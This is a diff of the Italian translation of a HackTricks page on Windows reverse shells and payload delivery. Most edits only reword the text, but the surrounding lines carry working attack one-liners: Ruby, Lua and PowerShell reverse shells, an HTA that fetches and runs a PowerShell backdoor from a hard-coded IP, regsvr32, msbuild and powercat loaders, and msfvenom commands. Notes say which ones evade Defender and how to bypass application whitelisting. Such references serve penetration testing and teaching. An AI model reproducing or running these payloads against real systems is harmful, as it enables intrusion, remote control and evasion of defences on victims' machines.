@@ -16,7 +16,7 @@ Altri modi per supportare HackTricks:
 
 **Try Hard Security Group**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -61,6 +61,8 @@ perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen(
 ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
 ## Lua
+
+Lua è un linguaggio di scripting leggero e potente che può essere incorporato in applicazioni per fornire flessibilità e automazione. È ampiamente utilizzato per estendere funzionalità e personalizzare il comportamento di software e giochi. Lua è noto per la sua semplicità, velocità ed efficienza.
 ```bash
 lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
 ```
@@ -92,10 +94,10 @@ Payload scritto su disco: **NO** (_almeno da nessuna parte che ho potuto trovare
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
-Processo che effettua chiamate di rete: **svchost.exe**\
+Processo che effettua la chiamata di rete: **svchost.exe**\
 Payload scritto su disco: **cache locale del client WebDAV**
 
-**Una riga:**
+**One liner:**
 ```bash
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
@@ -115,7 +117,7 @@ mshta http://webserver/payload.hta
 ```bash
 mshta \\webdavserver\folder\payload.hta
 ```
-#### **Esempio di shell inversa hta-psh (utilizzo di hta per scaricare ed eseguire il backdoor di PS)**
+#### **Esempio di shell inversa hta-psh (usa hta per scaricare ed eseguire il backdoor di PS)**
 ```xml
 <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
 ```
@@ -228,7 +230,7 @@ regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
 ```
 regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
 ```
-**Rilevato dal difensore**
+**Rilevato da Defender**
 
 #### Regsvr32 -sct
 
@@ -283,7 +285,7 @@ powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0
 ```bash
 msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
 ```
-**Rilevato dal difensore**
+**Rilevato da Defender**
 
 ## PS-Bat
 ```bash
@@ -299,7 +301,7 @@ impacket-smbserver -smb2support kali `pwd`
 ```bash
 \\10.8.0.3\kali\shell.bat
 ```
-**Rilevato da Defender**
+**Rilevato dal difensore**
 
 ## **MSIExec**
 
@@ -334,7 +336,7 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 ```
 **Non rilevato**
 
-**È possibile scaricare ed eseguire molto facilmente uno zombie Koadic utilizzando lo stager wmic**
+**Puoi scaricare ed eseguire molto facilmente uno zombie Koadic utilizzando lo stager wmic**
 
 ## Msbuild
 
@@ -342,7 +344,7 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 ```
 cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
 ```
-Puoi utilizzare questa tecnica per bypassare la lista bianca dell'applicazione e le restrizioni di Powershell.exe. Poiché ti verrà richiesto di utilizzare una shell di PS.\
+Puoi utilizzare questa tecnica per bypassare la lista bianca delle applicazioni e le restrizioni di Powershell.exe. Poiché ti verrà richiesto di utilizzare una shell di PS.\
 Basta scaricare questo file ed eseguirlo: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
@@ -355,7 +357,7 @@ Compilare il codice C# nella macchina vittima.
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
 ```
-Puoi scaricare una shell inversa di base in C# da qui: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
+Puoi scaricare una shell inversa C# di base da qui: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
 
 **Non rilevato**
 
@@ -395,7 +397,7 @@ powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
 Defender non lo rileva come codice maligno (almeno fino al 3/04/2019).
 
-**DA FARE: Controllare altre shell nishang**
+**TODO: Controllare altre shell nishang**
 
 ### **PS-Powercat**
 
@@ -405,9 +407,11 @@ Scarica, avvia un server web, avvia il listener ed eseguilo sul computer della v
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
+Defender non lo rileva come codice maligno (ancora, 3/04/2019).
+
 **Altre opzioni offerte da powercat:**
 
-Shell di bind, shell inversa (TCP, UDP, DNS), reindirizzamento di porta, caricamento/scaricamento, Generare payload, Servire file...
+Shell di bind, Shell inversa (TCP, UDP, DNS), Reindirizzamento di porta, upload/download, Generare payload, Servire file...
 ```
 Serve a cmd Shell:
 powercat -l -p 443 -e cmd
@@ -432,13 +436,13 @@ Crea un lanciatore powershell, salvandolo in un file e scaricalo ed eseguilo.
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
-**Codice rilevato come maligno**
+**Rilevato come codice dannoso**
 
 ### MSF-Unicorn
 
 [https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)
 
-Crea una versione in powershell di una backdoor di metasploit utilizzando unicorn
+Crea una versione di powershell del backdoor di metasploit utilizzando unicorn
 ```
 python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
 ```
@@ -450,7 +454,7 @@ Avvia un server web che serve il file _powershell\_attack.txt_ e esegui nel comp
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
-**Codice rilevato come maligno**
+**Rilevato come codice maligno**
 
 ## Altro
 
@@ -470,7 +474,7 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) console PS con alcuni moduli P
 ​
 **Try Hard Security Group**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -480,9 +484,9 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) console PS con alcuni moduli P
 
 Altri modi per supportare HackTricks:
 
-* Se desideri vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
+* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
 * Ottieni il [**merchandising ufficiale PEASS & HackTricks**](https://peass.creator-spring.com)
-* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
+* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
 * **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
 * **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repository di Github.
 
